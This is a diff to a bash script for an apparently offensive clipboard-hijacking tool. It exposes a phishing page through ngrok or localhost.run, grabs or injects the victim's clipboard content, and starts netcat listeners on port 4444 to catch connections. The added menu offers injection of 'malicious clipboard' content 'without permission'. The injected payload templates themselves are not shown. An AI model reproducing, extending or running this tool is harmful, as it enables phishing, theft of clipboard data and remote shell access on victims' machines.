@@ -83,6 +83,17 @@ printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
+if [[ $grab_inject == false ]]; then
+printf "\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[93m Malicious code injected!\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
+if [[ $forward == true ]];then
+
+nc -lvp 4444
+else
+nc -lvp $server_port
+fi
+fi
+
 fi
 
 sleep 0.5
@@ -95,9 +106,9 @@ printf "\n\e[0m"
 touch clipboard_backup.txt
 cat clipboard.txt >> clipboard_backup.txt
 rm -rf clipboard.txt
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m clipboard_backup.txt\e[0m\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m clipboard_backup.txt\e[0m\n"
 printf "\n\e[1;92m[\e[0m+\e[1;92m]\e[0m\e[93m Malicious code injected!\e[0m\n"
-printf "\n\e[1;92m[\e[0m*\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m]\e[0m\e[1;77m Listener Started...\e[0m\n"
 if [[ $forward == true ]];then
 
 nc -lvp 4444
@@ -215,10 +226,35 @@ server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tc
 printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 choose-subdomain@ssh.localhost.run \e[0m\n"
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Send the \e[0m\e[1;77mHTTPS\e[0m\e[92m link \e[0m\n"
-
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Clipboard access is only allowed over \e[0m\e[1;77mHTTPS\e[0m\e[92m domains \e[0m\n"
 fi
 
+if [[ $grab_inject == true ]]; then
 sed 's+server_tcp+'$server_tcp'+g' cliptext.html | sed 's+server_port+'$server_port'+g' > index.php
+else
+sed 's+server_tcp+'$server_tcp'+g' writetext.html | sed 's+server_port+'$server_port'+g' > index.php
+fi
+
+}
+
+clip_option() {
+
+
+printf "\n"
+printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Grab/Inject clipboard content \e[0m\e[1;77m(requires user permission)\e[0m\e[1;93m:\e[0m\n"
+printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Inject malicious clipboard \e[0m\e[1;77m(doenst require permission)\e[0m\e[1;93m:\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m' option_clip
+option_server="${option_server:-${default_option_server}}"
+
+if [[ $option_clip -eq 1 ]]; then
+grab_inject=true
+elif [[ $option_clip -eq 2 ]]; then
+grab_inject=false
+else
+printf "\e[1;91m[!] Invalid option\n"
+exit 1
+fi
 
 }
 
@@ -275,6 +311,7 @@ fi
 
 banner
 dependencies
+clip_option
 ngrok_server
 payload
 checkfound
